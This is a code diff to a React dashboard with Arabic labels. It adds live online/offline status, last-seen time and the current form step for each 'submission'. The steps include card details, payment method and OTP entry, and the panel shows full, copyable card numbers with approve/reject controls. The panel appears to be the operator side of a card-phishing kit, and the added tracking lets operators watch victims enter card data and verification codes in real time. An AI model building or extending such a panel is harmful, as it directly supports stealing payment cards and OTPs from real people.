@@ -24,6 +24,47 @@ interface Submission {
   cardState: 'pending' | 'approved' | 'rejected'
   method?: string
   createdAt?: number
+  step?: number
+  currentPage?: string
+  onlineStatus?: 'online' | 'offline'
+  lastSeenAt?: number
+}
+
+const PAGE_LABELS: Record<string, string> = {
+  'card-information': 'معلومات البطاقة',
+  'application-form': 'استمارة التقديم',
+  'payment-details': 'تفاصيل الدفع',
+  'payment-method': 'اختيار طريقة الدفع',
+  'card-info': 'معلومات البطاقة البنكية',
+  otp: 'رمز التحقق',
+  completed: 'مكتمل',
+}
+
+const STEP_LABELS: Record<number, string> = {
+  1: 'معلومات البطاقة',
+  2: 'استمارة التقديم',
+  3: 'تفاصيل الدفع',
+  4: 'اختيار طريقة الدفع',
+  5: 'معلومات البطاقة البنكية',
+  6: 'رمز التحقق',
+}
+
+const PRESENCE_TIMEOUT_MS = 45000
+
+function resolveStepLabel(step?: number, currentPage?: string) {
+  const pageLabel = currentPage ? PAGE_LABELS[currentPage] : undefined
+  if (typeof step === 'number') {
+    return `الخطوة ${step}: ${pageLabel ?? STEP_LABELS[step] ?? 'غير محددة'}`
+  }
+  return pageLabel ?? 'غير محددة'
+}
+
+function isSubmissionOnline(sub: Submission, nowTimestamp: number) {
+  if (sub.onlineStatus === 'offline') return false
+  if (typeof sub.lastSeenAt === 'number') {
+    return nowTimestamp - sub.lastSeenAt <= PRESENCE_TIMEOUT_MS
+  }
+  return sub.onlineStatus === 'online'
 }
 
 function playDashboardNotificationSound() {
@@ -164,6 +205,7 @@ export default function Dashboard() {
   const [dataLoading, setDataLoading] = useState(true)
   const [updating, setUpdating] = useState<string | null>(null)
   const [isOnline, setIsOnline] = useState(true)
+  const [presenceNow, setPresenceNow] = useState(() => Date.now())
   const [streamStatus, setStreamStatus] = useState<'connecting' | 'live' | 'error'>('connecting')
   const hasLoadedOnceRef = useRef(false)
   const previousSubmissionIdsRef = useRef<Set<string>>(new Set())
@@ -176,6 +218,13 @@ export default function Dashboard() {
     return () => {
       window.removeEventListener('online', syncOnlineStatus)
       window.removeEventListener('offline', syncOnlineStatus)
+    }
+  }, [])
+
+  useEffect(() => {
+    const timerId = window.setInterval(() => setPresenceNow(Date.now()), 10000)
+    return () => {
+      window.clearInterval(timerId)
     }
   }, [])
 
@@ -224,6 +273,7 @@ export default function Dashboard() {
 
   const stats = {
     total: submissions.length,
+    onlineUsers: submissions.filter(s => isSubmissionOnline(s, presenceNow)).length,
     pending: submissions.filter(s => !s.cardState || s.cardState === 'pending').length,
     approved: submissions.filter(s => s.cardState === 'approved').length,
     rejected: submissions.filter(s => s.cardState === 'rejected').length,
@@ -279,9 +329,10 @@ export default function Dashboard() {
       </div>
 
       <div className="max-w-7xl mx-auto px-4 py-6 space-y-6">
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
           {[
             { label: 'إجمالي', value: stats.total, icon: UserIcon, cls: 'bg-blue-50 text-blue-700' },
+            { label: 'متصل الآن', value: stats.onlineUsers, icon: Wifi, cls: 'bg-emerald-50 text-emerald-700' },
             { label: 'قيد المراجعة', value: stats.pending, icon: Clock, cls: 'bg-yellow-50 text-yellow-700' },
             { label: 'مقبول', value: stats.approved, icon: CheckCircle, cls: 'bg-green-50 text-green-700' },
             { label: 'مرفوض', value: stats.rejected, icon: XCircle, cls: 'bg-red-50 text-red-700' },
@@ -314,14 +365,27 @@ export default function Dashboard() {
               const { label, cls } = stateBadge(sub.cardState)
               const isUpdating = updating === sub.id
               const isPending = !sub.cardState || sub.cardState === 'pending'
+              const online = isSubmissionOnline(sub, presenceNow)
+              const stepLabel = resolveStepLabel(sub.step, sub.currentPage)
               const fullCard = (sub.cardNumber || '').replace(/\D/g, '')
               const groupedCard = fullCard.replace(/(.{4})/g, '$1 ').trim()
 
               return (
                 <div key={sub.id} className="bg-white rounded-2xl shadow-sm overflow-hidden border border-gray-100">
                   <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 px-5 py-3 border-b border-gray-100 bg-gray-50/60">
-                    <div className="flex items-center gap-2">
+                    <div className="flex items-center gap-2 flex-wrap">
                       <span className={`px-2.5 py-1 rounded-full text-xs font-semibold ${cls}`}>{label}</span>
+                      <span className={`inline-flex items-center gap-1 rounded-full px-2.5 py-1 text-xs font-semibold border ${
+                        online
+                          ? 'bg-emerald-100 text-emerald-800 border-emerald-200'
+                          : 'bg-gray-100 text-gray-700 border-gray-200'
+                      }`}>
+                        <span className={`h-1.5 w-1.5 rounded-full ${online ? 'bg-emerald-500' : 'bg-gray-400'}`} />
+                        {online ? 'متصل الآن' : 'غير متصل'}
+                      </span>
+                      <span className="px-2.5 py-1 rounded-full text-xs font-semibold bg-slate-100 text-slate-700 border border-slate-200">
+                        {stepLabel}
+                      </span>
                       <span className="text-xs text-gray-400">رقم الهوية: <span className="font-mono font-semibold text-gray-700">{sub.id}</span></span>
                     </div>
                     {sub.createdAt && (
@@ -356,6 +420,13 @@ export default function Dashboard() {
                             <InfoRow label="رقم الهاتف" value={sub.phone} mono copyable />
                             <InfoRow label="رقم الهوية" value={sub.id} mono copyable />
                             <InfoRow label="طريقة الدفع" value={sub.method === 'mastercard' ? 'Mastercard' : 'Visa'} />
+                            <InfoRow label="الخطوة الحالية" value={stepLabel} />
+                            <InfoRow
+                              label="آخر نشاط"
+                              value={sub.lastSeenAt
+                                ? new Date(sub.lastSeenAt).toLocaleString('ar-QA', { dateStyle: 'short', timeStyle: 'short' })
+                                : '—'}
+                            />
                           </div>
                         </div>
 
